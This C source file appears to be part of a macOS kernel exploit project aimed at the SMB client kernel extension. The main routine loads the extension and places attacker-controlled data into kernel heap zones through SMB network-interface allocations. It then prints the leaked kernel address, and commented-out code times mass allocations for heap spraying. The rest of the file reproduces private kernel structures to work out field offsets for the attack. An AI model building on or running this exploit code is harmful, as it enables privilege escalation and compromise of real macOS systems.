//
//  main.c
//  kmem_xepg
//
//  Created by admin on 12/18/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <libproc.h>
#include <dispatch/dispatch.h>

#include <sys/time.h>
#include <sys/errno.h>
#include <arpa/inet.h>
#include <sys/un.h>

#include "external/smbfs/smbfs.h"
#include "external/smbfs/smbclient_internal.h"
#include "smb/client.h"
#include "nic_allocator.h"
#include "ssn_allocator.h"
#include "kmem/allocator_nic_parallel.h"
#include "xnu/saddr_allocator.h"
#include "platform_constants.h"
#include "util_misc.h"
#include "util_binary.h"
#include "util_dispatch.h"
#include "kmem/zkext_free.h"
#include "kmem/zalloc_kext_small.h"


void allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t saddr_size) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info* infos = malloc(sizeof(struct network_nic_info) * batch_size + saddr_size);
        bzero(infos, sizeof(struct network_nic_info) * batch_size);
        for (int sock_idx=0; sock_idx < batch_size; sock_idx++) {
            struct network_nic_info* info = &infos[sock_idx];
            info->nic_index = nic_index;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = saddr_size;
            info->addr_4.sin_port = htons(1234);
            info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
            info->next_offset = sizeof(*info);
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)(sizeof(struct network_nic_info) * batch_size + saddr_size));
        assert(error == 0);
        free(infos);
        done += batch_size;
    }
}


int main(void) {
    smb_client_load_kext();

    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);

    struct sockaddr_in saddr;
    bzero(&saddr, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_len = sizeof(saddr);
    saddr.sin_port = htons(8090);
    inet_aton("127.0.0.1", &saddr.sin_addr);
    
    char data[256 - 8 - 1];
    memset(data, 0xff, sizeof(data));
    struct kmem_zalloc_kext_small_entry entry = kmem_zalloc_kext_small(&saddr, data, sizeof(data));
    printf("%p\n", (void*)entry.address);
    smb_nic_allocator_destroy(&entry.element_allocator);
    
//    char data[255];
//    kmem_zalloc_kext_small(&saddr, data, sizeof(data));
//    kmem_zkext_freekext(&saddr, 0);
//    kmem_kext_768_capture(&saddr);
    
//    printf("%lu %lu\n", offsetof(struct sockaddr_in, sin_addr), sizeof(saddr.sin_addr));
//
//
//    kmem_allocator_nic_parallel_t parallel_allocator = kmem_allocator_nic_parallel_create(&saddr, 502400);
//    char data[96 - 8];
//    memset(data, 0xa, sizeof(data));
//
//    struct timespec start;
//    clock_gettime(CLOCK_MONOTONIC, &start);
//    kmem_allocator_nic_parallel_alloc(parallel_allocator, data, sizeof(data));
//    struct timespec end;
//    clock_gettime(CLOCK_MONOTONIC, &end);
//    long ds = end.tv_sec - start.tv_sec;
//    long dns = end.tv_nsec - start.tv_nsec;
//    long total_ns = ds * 1000000000 + dns;
//    double seconds = (double)total_ns / 1e9;
//    printf("took %fs to allocate\n", seconds);
//
//
//    smb_nic_allocator allocator;
//    int error = smb_nic_allocator_create(&saddr, sizeof(saddr), &allocator);
//    assert(error == 0);
//
//    int num_nics = 100;
//    for (int i=0; i<num_nics; i++) {
//        printf("%d / %d\n", i, num_nics);
//        allocate_sockets(allocator, i, 20240, 255);
//    }
//
//    clock_gettime(CLOCK_MONOTONIC, &start);
//    smb_nic_allocator_destroy(&allocator);
//    clock_gettime(CLOCK_MONOTONIC, &end);
//
//    ds = end.tv_sec - start.tv_sec;
//    dns = end.tv_nsec - start.tv_nsec;
//    total_ns = ds * 1000000000 + dns;
//    seconds = (double)total_ns / 1e9;
//
//    printf("took %fs to free\n", seconds);
    return 0;
}


/*
 * network IO daemon states
 */
enum smbiod_state {
    SMBIOD_ST_NOTCONN,        /* no connect request was made */
    SMBIOD_ST_CONNECT,        /* a connect attempt is in progress */
    SMBIOD_ST_TRANACTIVE,     /* TCP transport level is connected */
    SMBIOD_ST_NEGOACTIVE,     /* completed negotiation */
    SMBIOD_ST_SSNSETUP,       /* started (a) session setup */
    SMBIOD_ST_SESSION_ACTIVE, /* SMB session established */
    SMBIOD_ST_DEAD,           /* connection broken, transport is down */
    SMBIOD_ST_RECONNECT_AGAIN,/* We need to attempt to reconnect again */
    SMBIOD_ST_RECONNECT       /* Currently in reconnect */
};

struct __lck_mtx_t__ {
    uintptr_t opaque[2];
};

typedef struct __lck_mtx_t__ lck_mtx_t;

struct smb_rqhead {
    void* next;
    void** prev;
};

typedef enum gssd_nametype {
    GSSD_STRING_NAME = 0,
    GSSD_EXPORT,
    GSSD_ANONYMOUS,
    GSSD_HOSTBASED,
    GSSD_USER,
    GSSD_MACHINE_UID,
    GSSD_STRING_UID,
    GSSD_KRB5_PRINCIPAL,
    GSSD_KRB5_REFERRAL,
    GSSD_NTLM_PRINCIPAL,
    GSSD_NTLM_BLOB,
    GSSD_UUID
} gssd_nametype;

#define SMB3_KEY_LEN 16
#define SHA512_DIGEST_LENGTH 64

struct smb_gss {
    au_asid_t     gss_asid;        /* Audit session id to find gss_mp */
    gssd_nametype gss_target_nt;   /* Service's principal's name type */
    uint32_t      gss_spn_len;     /* Service's principal's length */
    uint8_t *     gss_spn;         /* Service's principal name */
    gssd_nametype gss_client_nt;   /* Client's principal's name type */
    uint32_t      gss_cpn_len;     /* Client's principal's length */
    uint8_t *     gss_cpn;         /* Client's principal name */
    char *        gss_cpn_display; /* String representation of client principal */
    uint32_t      gss_tokenlen;    /* Gss token length */
    uint8_t *     gss_token;       /* Gss token */
    uint64_t      gss_ctx;         /* GSS opaque context handle */
    uint64_t      gss_cred;        /* GSS opaque cred handle */
    uint32_t      gss_rflags;      /* Flags returned from gssd */
    uint32_t      gss_major;       /* GSS major error code */
    uint32_t      gss_minor;       /* GSS minor (mech) error code */
    uint32_t      gss_smb_error;   /* Last error returned by smb SetUpAndX */
};

struct conn_params {
    struct session_con_entry  *con_entry;
    uint64_t client_if_idx;                     // IF index of the client NIC
    struct sock_addr_entry    *selected_saddr;  // The currently selected server IP address
};

struct smbiod {
    int                 iod_id;
    int                 iod_flags;
    enum smbiod_state   iod_state;
    lck_mtx_t           iod_flagslock;        /* iod_flags */
    /* number of active outstanding requests (keep it signed!) */
    int32_t             iod_muxcnt;
    /* number of active outstanding async requests (keep it signed!) */
    int32_t             iod_asynccnt;
    struct timespec     iod_sleeptimespec;
    struct smb_session *iod_session;
    lck_mtx_t           iod_rqlock;           /* iod_rqlist, iod_muxwant */
    struct smb_rqhead   iod_rqlist;           /* list of outstanding requests */
    int                 iod_muxwant;
    void*       iod_context;
    lck_mtx_t           iod_evlock;           /* iod_evlist */
    STAILQ_HEAD(,smbiod_event) iod_evlist;
    struct timespec     iod_lastrqsent;
    struct timespec     iod_lastrecv;
    int                 iod_workflag;         /* should be protected with lock */
    struct timespec     reconnectStartTime;   /* Time when the reconnect was started */
    
    /* MultiChannel Support */
    TAILQ_ENTRY(smbiod) tailq;                  /* list of iods per session */
    struct sockaddr     *iod_saddr;             /* server addr */
    struct sockaddr     *iod_laddr;             /* local addr, if any, only used for port 139 */
    void                *iod_tdata;             /* transport control block */
    uint32_t            iod_ref_cnt;            /* counts references to this iod, protected by iod_tailq_lock */
    struct smb_tran_desc *iod_tdesc;            /* transport functions */
    struct smb_gss      iod_gss;                /* Parameters for gssd */
    uint64_t            iod_message_id;         /* SMB 2/3 request message id */
    uint32_t            negotiate_tokenlen;     /* negotiate token length */
    uint8_t             *negotiate_token;       /* negotiate token */
    uint32_t            iod_credits_granted;    /* SMB 2/3 credits granted */
    uint32_t            iod_credits_ss_granted; /* SMB 2/3 credits granted from session setup replies */
    uint32_t            iod_credits_max;        /* SMB 2/3 max amount of credits server has granted us */
    int32_t             iod_credits_wait;       /* SMB 2/3 credit wait */
    uint32_t            iod_req_pending;        /* SMB 2/3 set if there is a pending request */
    uint64_t            iod_oldest_message_id;  /* SMB 2/3 oldest pending request message id */
    lck_mtx_t           iod_credits_lock;

    /* Alternate channels have their own signing key */
    uint8_t             *iod_mackey;            /* MAC key */
    uint32_t            iod_mackeylen;          /* length of MAC key */
    uint8_t             iod_smb3_signing_key[SMB3_KEY_LEN]; /* Channel.SigningKey */
    uint32_t            iod_smb3_signing_key_len;

    /* SMB 3.1.1 PreAuthIntegrity fields */
    uint8_t             iod_pre_auth_int_salt[32]; /* Random number */
    uint8_t             iod_pre_auth_int_hash_neg[SHA512_DIGEST_LENGTH] __attribute__((aligned(4)));
    uint8_t             iod_pre_auth_int_hash[SHA512_DIGEST_LENGTH] __attribute__((aligned(4)));

    struct conn_params  iod_conn_entry;
    uint64_t            iod_total_tx_bytes;     /* The total number of bytes transmitted by this iod */
    uint64_t            iod_total_rx_bytes;     /* The total number of bytes received by this iod */
    struct timespec     iod_session_setup_time;
    
    /* Saved last session setup reply */
    uint8_t             *iod_sess_setup_reply;  /* Used for pre auth and alt channels */
    size_t              iod_sess_setup_reply_len;
};


typedef uint64_t SMBFID;

typedef enum smb_mc_control {
    SMB2_MC_REPLAY_FLAG         = 0, /* This is a retransmit, ie, set the SMB2_FLAGS_REPLAY_OPERATIONS flag */
} _SMB2_MC_CONTROL;


struct smb2_create_rq {
    uint64_t flags;                 /* defined above */
    uint8_t oplock_level;
    uint8_t pad[3];
    uint32_t impersonate_level;
    uint32_t desired_access;
    uint32_t file_attributes;
    uint32_t share_access;
    uint32_t disposition;
    uint32_t create_options;
    uint32_t name_len;
    uint32_t strm_name_len;         /* stream name len */
    uint32_t pad2;
    struct smbnode *dnp;
    char *namep;
    char *strm_namep;               /* stream name */
    void *create_contextp;          /* used for various create contexts */
    struct timespec req_time;       /* time this create was done */
    enum smb_mc_control mc_flags;

    /* return values */
    uint32_t ret_ntstatus;
    uint32_t ret_attributes;
    uint8_t ret_oplock_level;
    uint8_t ret_pad[3];
    uint32_t ret_create_action;
    uint64_t ret_create_time;
    uint64_t ret_access_time;
    uint64_t ret_write_time;
    uint64_t ret_change_time;
    uint64_t ret_alloc_size;
    uint64_t ret_eof;
    SMBFID ret_fid;
    uint32_t ret_max_access;
    uint32_t ret_pad2;
};

struct smbfs_args {
    int32_t        altflags;
    uid_t        uid;
    gid_t         gid;
    guid_t        uuid;        /* The UUID of the user that mounted the volume */
    mode_t         file_mode;
    mode_t         dir_mode;
    size_t        local_path_len;      /* Must be less than MAXPATHLEN and does not count the null byte */
    char        *local_path;      /* Submount path they want to use with this mounted volume */
    size_t        network_path_len; /* Len of submount path in network format */
    char        *network_path;      /* Submount path in network format */
    int32_t        unique_id_len;
    unsigned char    *unique_id;    /* A set of bytes that uniquely identifies this volume */
    char        *volume_name;
    int32_t         ip_QoS;
    int32_t        dir_cache_async_cnt; /* Max nbr of async calls to fill dir cache */
    int32_t        dir_cache_max; /* Max time to cache entries */
    int32_t        dir_cache_min; /* Min time to cache entries */
    int32_t         max_dirs_cached;
    int32_t         max_dir_entries_cached;
    uint32_t    max_read_size; /* user defined max read size if not zero */
    uint32_t    max_write_size; /* user defined max write size if not zero */
};

typedef struct __lck_rw_t__ {
    uintptr_t opaque[2];
} lck_rw_t;

struct smbmount {
    uint64_t        ntwrk_uid;
    uint64_t        ntwrk_gid;
    uint32_t        ntwrk_cnt_gid;
    uint64_t        *ntwrk_gids;
    void            *ntwrk_sids;
    uint32_t        ntwrk_sids_cnt;
    struct smbfs_args    sm_args;
    struct mount *         sm_mp;
    vnode_t            sm_rvp;
    uint64_t        sm_root_ino;
    struct smb_share *     sm_share;
    lck_rw_t        sm_rw_sharelock;
    int            sm_flags;
    lck_mtx_t        *sm_hashlock;
    LIST_HEAD(smbnode_hashhead, smbnode) *sm_hash;
    u_long            sm_hashlen;
    uint32_t        sm_status; /* status bits for this mount */
    time_t            sm_statfstime; /* sm_statfsbuf cache time */
    lck_mtx_t        sm_statfslock; /* sm_statsbuf lock */
    struct vfsstatfs    sm_statfsbuf; /* cached statfs data */
    void            *notify_thread;    /* pointer to the notify thread structure */
    int32_t            tooManyNotifies;
    lck_mtx_t        sm_svrmsg_lock;        /* protects svrmsg fields */
    uint64_t        sm_svrmsg_pending;    /* svrmsg replies pending (bits defined above) */
    uint32_t        sm_svrmsg_shutdown_delay;  /* valid when SVRMSG_GOING_DOWN is set */
};


struct session_network_interface_info {
    lck_mtx_t interface_table_lck;
    uint32_t pause_trials;
    uint32_t client_nic_count;
    struct {
        uintptr_t refs[2];
    } client_nic_info_list; /* list of the client's available NICs */
    uint32_t server_nic_count;
    struct {
        uintptr_t refs[2];
    } server_nic_info_list; /* list of the server's available NICs */

    uint32_t max_channels;
    uint32_t max_rss_channels;
    uint32_t *client_if_blacklist;
    uint32_t client_if_blacklist_len;
    uint32_t prefer_wired;

    /*
     * Table of all possible connections represent the state of every
     * couple of NICs.
     * The size of the table is (client_nic_count * server_nic_count).
     * In case of a successful connection will note the functionality of the connection.
     */
    struct {
        uintptr_t refs[2];
    } session_con_list;    /* list of all possible connection - use next */
    uint32_t active_on_trial_connections;            /* record for the amount of open trial connections */
    struct {
        uintptr_t refs[2];
    } successful_con_list; /* list of all successful connection - use success_next */
};

enum nbstate {
    NBST_1
};

/*
 * socket specific data
 */
struct nbpcb {
    struct smbiod      *nbp_iod;
    void*            nbp_tso;    /* transport socket */
    struct sockaddr_nb *nbp_laddr;  /* local address */
    struct sockaddr_nb *nbp_paddr;  /* peer address */

    int                 nbp_flags;
    enum nbstate        nbp_state;
    struct timespec     nbp_timo;
    uint32_t            nbp_sndbuf;
    uint32_t            nbp_rcvbuf;
    uint32_t            nbp_rcvchunk;
    void               *nbp_selectid;
    void              (*nbp_upcall)(void *);
    lck_mtx_t           nbp_lock;
    uint32_t            nbp_qos;
    struct sockaddr_storage nbp_sock_addr;
    uint32_t            nbp_if_idx;
/*    LIST_ENTRY(nbpcb) nbp_link;*/
};

typedef enum _SMB2_MC_CON_STATE {
    SMB2_MC_STATE_POTENTIAL          = 0x00,
    SMB2_MC_STATE_NO_POTENTIAL       = 0x01, /* NICs doesn't have potential for connection (mainly ip mismatch). */
    SMB2_MC_STATE_IN_TRIAL           = 0x02, /* this connection sent to connect flow */
    SMB2_MC_STATE_FAILED_TO_CONNECT  = 0x03, /* this connection failed in connect flow */
    SMB2_MC_STATE_CONNECTED          = 0x04, /* this connection is being used */
    SMB2_MC_STATE_SURPLUS            = 0x05, /* this connection can't be used since one of it's NICs
                                              * is being used in another connection. */
    SMB2_MC_STATE_IN_REMOVAL         = 0x06, /* this connection sent to removal flow because it was no longer
                                              * needed (redundant, too slow, etc). It will switch to potential
                                              * once the iod is destroyed */
}_SMB2_MC_CON_STATE;

typedef enum _SMB2_MC_CON_ACTIVE_STATE {
    SMB2_MC_FUNC_ACTIVE              = 0x00, /* the connection is active */
    SMB2_MC_FUNC_INACTIVE            = 0x01, /* the connection is inactive */
    SMB2_MC_FUNC_INACTIVE_REDUNDANT  = 0x02, /* the connection is inactive and redundant */

}_SMB2_MC_CON_ACTIVE_STATE;

struct session_con_entry {
    _SMB2_MC_CON_STATE        state;        /* the state of the connection couple */
    _SMB2_MC_CON_ACTIVE_STATE active_state; /* the active state of a connected connection couple */
    uint64_t                  con_speed;    /* the min between the 2 nics */

    struct smbiod * iod;      /* pointer to the iod that is responsible
                                 for this connection*/
    
    struct complete_nic_info_entry* con_client_nic;
    struct complete_nic_info_entry* con_server_nic;
    
    TAILQ_ENTRY(session_con_entry) next;         /* link list of all connection entries */
    TAILQ_ENTRY(session_con_entry) client_next;  /* for quick access from client nic */
    TAILQ_ENTRY(session_con_entry) success_next; /* for quick access when
                                                    looking for successful connections */
};


int main0(void) {
//    printf("%lu\n", sizeof(struct session_con_entry));
//    printf("%lu\n", offsetof(struct smbiod, iod_gss));
//    printf("%lu\n", offsetof(struct smb_gss, gss_cpn_len));
//    printf("%lu\n", offsetof(struct smb_gss, gss_cpn));
//    printf("%lu\n", offsetof(struct sockaddr_in, sin_addr));
//
//    printf("%lu\n", offsetof(struct network_nic_info, addr));
    
//    printf("%lu\n", sizeof(struct session_network_interface_info));
    
//    printf("%lu\n", offsetof(struct network_nic_info, addr));
    
//    printf("%lu\n", sizeof(struct nbpcb));
    return 0;
}
